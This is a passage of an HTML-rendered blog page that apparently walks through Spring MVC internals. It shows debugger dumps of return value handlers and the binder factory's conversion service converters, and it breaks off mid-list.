&#123;ModelAndViewMethodReturnValueHandler@6570&#125; </span><br><span class="line">  1 = &#123;ModelMethodProcessor@6571&#125; </span><br><span class="line">  2 = &#123;ViewMethodReturnValueHandler@6572&#125; </span><br><span class="line">  3 = &#123;ResponseBodyEmitterReturnValueHandler@6573&#125; </span><br><span class="line">  4 = &#123;StreamingResponseBodyReturnValueHandler@6574&#125; </span><br><span class="line">  5 = &#123;HttpEntityMethodProcessor@6575&#125; </span><br><span class="line">  6 = &#123;HttpHeadersReturnValueHandler@6576&#125; </span><br><span class="line">  7 = &#123;CallableMethodReturnValueHandler@6577&#125; </span><br><span class="line">  8 = &#123;DeferredResultMethodReturnValueHandler@6578&#125; </span><br><span class="line">  9 = &#123;AsyncTaskMethodReturnValueHandler@6579&#125; </span><br><span class="line">  10 = &#123;ModelAttributeMethodProcessor@6580&#125; </span><br><span class="line">  11 = &#123;RequestResponseBodyMethodProcessor@6581&#125; </span><br><span class="line">  12 = &#123;ViewNameMethodReturnValueHandler@6582&#125; </span><br><span class="line">  13 = &#123;MapMethodProcessor@6583&#125; </span><br><span class="line">  14 = &#123;ModelAttributeMethodProcessor@6584&#125;</span><br></pre></td></tr></table></figure><h3 id="binderFactory"><a href="#binderFactory" class="headerlink" title="binderFactory"></a>binderFactory</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">binderFactory = &#123;ServletRequestDataBinderFactory@6498&#125; </span><br><span class="line"> binderMethods = &#123;ArrayList@6585&#125;  size = 0</span><br><span class="line"> initializer = &#123;ConfigurableWebBindingInitializer@4859&#125; </span><br><span class="line">  autoGrowNestedPaths = true</span><br><span class="line">  directFieldAccess = false</span><br><span class="line">  messageCodesResolver = null</span><br><span class="line">  bindingErrorProcessor = null</span><br><span class="line">  validator = null</span><br><span class="line">  conversionService = &#123;DefaultFormattingConversionService@6586&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">   embeddedValueResolver = &#123;EmbeddedValueResolver@6003&#125; </span><br><span class="line">   cachedPrinters = &#123;ConcurrentHashMap@6588&#125;  size = 0</span><br><span class="line">   cachedParsers = &#123;ConcurrentHashMap@6589&#125;  size = 0</span><br><span class="line">   converters = &#123;GenericConversionService$Converters@6590&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">    globalConverters = &#123;LinkedHashSet@6593&#125;  size = 0</span><br><span class="line">    converters = &#123;LinkedHashMap@6594&#125;  size = 118</span><br><span class="line">     0 = &#123;LinkedHashMap$Entry@6597&#125; &quot;java.lang.Number -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Number : org.springframework.core.convert.support.NumberToNumberConverterFactory@76561efa&quot;</span><br><span class="line">     1 = &#123;LinkedHashMap$Entry@6598&#125; &quot;java.lang.String -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Number : org.springframework.core.convert.support.StringToNumberConverterFactory@1bf7855e&quot;</span><br><span class="line">     2 = &#123;LinkedHashMap$Entry@6599&#125; &quot;java.lang.Number -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@3932e255&quot;</span><br><span class="line">     3 = &#123;LinkedHashMap$Entry@6600&#125; &quot;java.lang.String -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Character : org.springframework.core.convert.support.StringToCharacterConverter@55a6b63f&quot;</span><br><span class="line">     4 = &#123;LinkedHashMap$Entry@6601&#125; &quot;java.lang.Character -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@1341d3bf&quot;</span><br><span class="line">     5 = &#123;LinkedHashMap$Entry@6602&#125; &quot;java.lang.Number -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Character : org.springframework.core.convert.support.NumberToCharacterConverter@34bb79fc&quot;</span><br><span class="line">     6 = &#123;LinkedHashMap$Entry@6603&#125; &quot;java.lang.Character -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.Number : org.springframework.core.convert.support.CharacterToNumberFactory@1ab51574&quot;</span><br><span class="line">     7 = &#123;LinkedHashMap$Entry@6604&#125; &quot;java.lang.String -&gt; java.lang.Boolean&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Boolean : org.springframework.core.convert.support.StringToBooleanConverter@7ac24f53&quot;</span><br><span class="line">     8 = &#123;LinkedHashMap$Entry@6605&#125; &quot;java.lang.Boolean -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Boolean -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@6703b79f&quot;</span><br><span class="line">     9 = &#123;LinkedHashMap$Entry@6606&#125; &quot;java.lang.String -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Enum : org.springframework.core.convert.support.StringToEnumConverterFactory@898561a&quot;</span><br><span class="line">     10 = &#123;LinkedHashMap$Entry@6607&#125; &quot;java.lang.Enum -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.String : org.springframework.core.convert.support.EnumToStringConverter@3a34ecc8&quot;</span><br><span class="line">     11 = &#123;LinkedHashMap$Entry@6608&#125; &quot;java.lang.Integer -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.Integer -&gt; java.lang.Enum : org.springframework.core.convert.support.IntegerToEnumConverterFactory@52e4840a&quot;</span><br><span class="line">     12 = &#123;LinkedHashMap$Entry@6609&#125; &quot;java.lang.Enum -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.Integer : org.springframework.core.convert.support.EnumToIntegerConverter@28217e86&quot;</span><br><span class="line">     13 = &#123;LinkedHashMap$Entry@6610&#125; &quot;java.lang.String -&gt; java.util.Locale&quot; -&gt; &quot;java.lang.String -&gt; java.util.Locale : org.springframework.core.convert.support.StringToLocaleConverter@6243d51e&quot;</span><br><span class="line">     14 = &#123;LinkedHashMap$Entry@6611&#125; &quot;java.util.Locale -&gt; java.lang.String&quot; -&gt; &quot;java.util.Locale -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@7f8c2732&quot;</span><br><span class="line">     15 = &#123;LinkedHashMap$Entry@6612&#125; &quot;java.lang.String -&gt; java.nio.charset.Charset&quot; -&gt; &quot;java.lang.String -&gt; java.nio.charset.Charset : org.springframework.core.convert.support.StringToCharsetConverter@93e281d&quot;</span><br><span class="line">     16 = &#123;LinkedHashMap$Entry@6613&#125; &quot;java.nio.charset.Charset -&gt; java.lang.String&quot; -&gt; &quot;java.nio.charset.Charset -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@2ac8a2f2&quot;</span><br><span class="line">     17 = &#123;LinkedHashMap$Entry@6614&#125; &quot;java.lang.String -&gt; java.util.Currency&quot; -&gt; &quot;java.lang.String -&gt; java.util.Currency : org.springframework.core.convert.support.StringToCurrencyConverter@565f7990&quot;</span><br><span class="line">     18 = &#123;LinkedHashMap$Entry@6615&#125; &quot;java.util.Currency -&gt; java.lang.String&quot; -&gt; &quot;java.util.Currency -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@487461de&quot;</span><br><span class="line">     19 = &#123;LinkedHashMap$Entry@6616&#125; &quot;java.lang.String -&gt; java.util.Properties&quot; -&gt; &quot;java.lang.String -&gt; java.util.Properties : org.springframework.core.convert.support.StringToPropertiesConverter@3072d60d&quot;</span><br><span class="line">     20 = &#123;LinkedHashMap$Entry@6617&#125; &quot;java.util.Properties -&gt; java.lang.String&quot; -&gt; &quot;java.util.Properties -&gt; java.lang.String : org.springframework.core.convert.support.PropertiesToStringConverter@5f423dc3&quot;</span><br><span class="line">     21 = &#123;LinkedHashMap$Entry@6618&#125; &quot;java.lang.String -&gt; java.util.UUID&quot; -&gt; &quot;java.lang.String -&gt; java.util.UUID : org.springframework.core.convert.support.StringToUUIDConverter@72fc4c42&quot;</span><br><span class="line">     22 = &#123;LinkedHashMap$Entry@6619&#125; &quot;java.util.UUID -&gt; java.lang.String&quot; -&gt; &quot;java.util.UUID -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@196db952&quot;</span><br><span class="line">     23 = &#123;LinkedHashMap$Entry@6620&#125; &quot;[Ljava.lang.Object; -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToCollectionConverter@3f09c6cc&quot;</span><br><span class="line">     24 = &#123;LinkedHashMap$Entry@6621&#125; &quot;java.util.Collection -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToArrayConverter@716b58cb&quot;</span><br><span class="line">     25 = &#123;LinkedHashMap$Entry@6622&#125; &quot;[Ljava.lang.Object; -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToArrayConverter@61e594f8&quot;</span><br><span class="line">     26 = &#123;LinkedHashMap$Entry@6623&#125; &quot;java.util.Collection -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToCollectionConverter@153616bf&quot;</span><br><span class="line">     27 = &#123;LinkedHashMap$Entry@6624&#125; &quot;java.util.Map -&gt; java.util.Map&quot; -&gt; &quot;org.springframework.core.convert.support.MapToMapConverter@64f88d73&quot;</span><br><span class="line">     28 = &#123;LinkedHashMap$Entry@6625&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToStringConverter@4f7e3c27&quot;</span><br><span class="line">     29 = &#123;LinkedHashMap$Entry@6626&#125; &quot;java.lang.String -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StringToArrayConverter@2713364&quot;</span><br><span class="line">     30 = &#123;LinkedHashMap$Entry@6627&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToObjectConverter@27574e7b&quot;</span><br><span class="line">     31 = &#123;LinkedHashMap$Entry@6628&#125; &quot;java.lang.Object -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToArrayConverter@7e4ccf7&quot;</span><br><span class="line">     32 = &#123;LinkedHashMap$Entry@6629&#125; &quot;java.util.Collection -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToStringConverter@39455728&quot;</span><br><span class="line">     33 = &#123;LinkedHashMap$Entry@6630&#125; &quot;java.lang.String -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StringToCollectionConverter@32a4a977&quot;</span><br><span class="line">     34 = &#123;LinkedHashMap$Entry@6631&#125; &quot;java.util.Collection -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToObjectConverter@2f1d1dce&quot;</span><br><span class="line">     35 = &#123;LinkedHashMap$Entry@6632&#125; &quot;java.lang.Object -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToCollectionConverter@ebfffae&quot;</span><br><span class="line">     36 = &#123;LinkedHashMap$Entry@6633&#125; &quot;[Ljava.lang.Object; -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     37 = &#123;LinkedHashMap$Entry@6634&#125; &quot;java.util.Collection -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     38 = &#123;LinkedHashMap$Entry@6635&#125; &quot;java.util.stream.Stream -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     39 = &#123;LinkedHashMap$Entry@6636&#125; &quot;java.util.stream.Stream -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     40 = &#123;LinkedHashMap$Entry@6637&#125; &quot;java.nio.ByteBuffer -&gt; [B&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     41 = &#123;LinkedHashMap$Entry@6638&#125; &quot;java.nio.ByteBuffer -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     42 = &#123;LinkedHashMap$Entry@6639&#125; &quot;java.lang.Object -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     43 = &#123;LinkedHashMap$Entry@6640&#125; &quot;[B -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     44 = &#123;LinkedHashMap$Entry@6641&#125; &quot;java.lang.String -&gt; java.util.TimeZone&quot; -&gt; &quot;java.lang.String -&gt; java.util.TimeZone : org.springframework.core.convert.support.StringToTimeZoneConverter@4d1c677c&quot;</span><br><span class="line">     45 = &#123;LinkedHashMap$Entry@6642&#125; &quot;java.time.ZoneId -&gt; java.util.TimeZone&quot; -&gt; &quot;java.time.ZoneId -&gt; java.util.TimeZone : org.springframework.core.convert.support.ZoneIdToTimeZoneConverter@3c2fb3fe&quot;</span><br><span class="line">     46 = &#123;LinkedHashMap$Entry@6643&#125; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar : org.springframework.core.convert.support.ZonedDateTimeToCalendarConverter@2148eb08&quot;</span><br><span class="line">     47 = &#123;LinkedHashMap$Entry@6644&#125; &quot;java.lang.Object -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.IdToEntityConverter@6c69ab13,org.springframework.core.convert.support.ObjectToObjectConverter@42600665&quot;</span><br><span class="line">     48 = &#123;LinkedHashMap$Entry@6645&#125; &quot;java.lang.Object -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.FallbackObjectToStringConverter@311fd94&quot;</span><br><span class="line">     49 = &#123;LinkedHashMap$Entry@6646&#125; &quot;java.lang.Object -&gt; java.util.Optional&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToOptionalConverter@65e75655&quot;</span><br><span class="line">     50 = &#123;LinkedHashMap$Entry@6647&#125; &quot;java.lang.Integer -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Integer -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     51 = &#123;LinkedHashMap$Entry@6648&#125; &quot;java.lang.String -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Integer: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     52 = &#123;LinkedHashMap$Entry@6649&#125; &quot;java.lang.Float -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Float -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     53 = &#123;LinkedHashMap$Entry@6650&#125; &quot;java.lang.String -&gt; java.lang.Float&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Float: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     54 = &#123;LinkedHashMap$Entry@6651&#125; &quot;java.math.BigInteger -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigInteger -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     55 = &#123;LinkedHashMap$Entry@6652&#125; &quot;java.lang.String -&gt; java.math.BigInteger&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigInteger: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     56 = &#123;LinkedHashMap$Entry@6653&#125; &quot;java.lang.Byte -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Byte -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     57 = &#123;LinkedHashMap$Entry@6654&#125; &quot;java.lang.String -&gt; java.lang.Byte&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Byte: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     58 = &#123;LinkedHashMap$Entry@6655&#125; &quot;java.lang.Double -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Double -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     59 = &#123;LinkedHashMap$Entry@6656&#125; &quot;java.lang.String -&gt; java.lang.Double&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Double: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     60 = &#123;LinkedHashMap$Entry@6657&#125; &quot;java.lang.Short -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Short -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     61 = &#123;LinkedHashMap$Entry@6658&#125; &quot;java.lang.String -&gt; java.lang.Short&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Short: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     62 = &#123;LinkedHashMap$Entry@6659&#125; &quot;java.lang.Long -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     63 = &#123;LinkedHashMap$Entry@6660&#125; &quot;java.lang.String -&gt; java.lang.Long&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.lang.Long: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Long: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     64 = &#123;LinkedHashMap$Entry@6661&#125; &quot;java.math.BigDecimal -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigDecimal -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     65 = &#123;LinkedHashMap$Entry@6662&#125; &quot;java.lang.String -&gt; java.math.BigDecimal&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigDecimal: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     66 = &#123;LinkedHashMap$Entry@6663&#125; &quot;java.util.Date -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@a178d09,java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@551d27e0&quot;</span><br><span class="line">     67 = &#123;LinkedHashMap$Entry@6664&#125; &quot;java.util.Date -&gt; java.util.Calendar&quot; -&gt; &quot;java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@2bd20c9a,java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@1c6b5a31&quot;</span><br><span class="line">     68 = &#123;LinkedHashMap$Entry@6665&#125; &quot;java.util.Calendar -&gt; java.util.Date&quot; -&gt; &quot;java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@2aa2f370,java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@163cf3e3&quot;</span><br><span class="line">     69 = &#123;LinkedHashMap$Entry@6666&#125; &quot;java.util.Calendar -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@2db18b62,java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@6bcdf637&quot;</span><br><span class="line">     70 = &#123;LinkedHashMap$Entry@6667&#125; &quot;java.lang.Long -&gt; java.util.Date&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@56c9b14d,java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@271bf39c&quot;</span><br><span class="line">     71 = &#123;LinkedHashMap$Entry@6668&#125; &quot;java.lang.Long -&gt; java.util.Calendar&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@6d08686,java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@2a8b425&quot;</span><br><span class="line">     72 = &#123;LinkedHashMap$Entry@6669&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalDateConverter@19f02ee4&quot;</span><br><span class="line">     73 = &#123;LinkedHashMap$Entry@6670&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalTimeConverter@618fb955&quot;</span><br><span class="line">     74 = &#123;LinkedHashMap$Entry@6671&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateConverter@63e9f754&quot;</span><br><span class="line">     75 = &#123;LinkedHashMap$Entry@6672&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalTimeConverter@24a76e90&quot;</span><br><span class="line">     76 = &#123;LinkedHashMap$Entry@6673&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateTimeConverter@3cb8e3ee&quot;</span><br><span class="line">     77 = &#123;LinkedHashMap$Entry@6674&#125; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToOffsetDateTimeConverter@2061a03d&quot;</span><br><span class="line">     78 = &#123;LinkedHashMap$Entry@6675&#125; &quot;java.time.ZonedDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToInstantConverter@c1ea032&quot;</span><br><span class="line">     79 = &#123;LinkedHashMap$Entry@6676&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateConverter@13d29ccf&quot;</span><br><span class="line">     80 = &#123;LinkedHashMap$Entry@6677&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalTimeConverter@680eaac8&quot;</span><br><span class="line">     81 = &#123;LinkedHashMap$Entry@6678&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateTimeConverter@45438fbc&quot;</span><br><span class="line">     82 = &#123;LinkedHashMap$Entry@6679&#125; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToZonedDateTimeConverter@3ca5a816&quot;</span><br><span class="line">     83 = &#123;LinkedHashMap$Entry@6680&#125; &quot;java.time.OffsetDateTime -&gt; java.time.Instant&quot; -&gt; 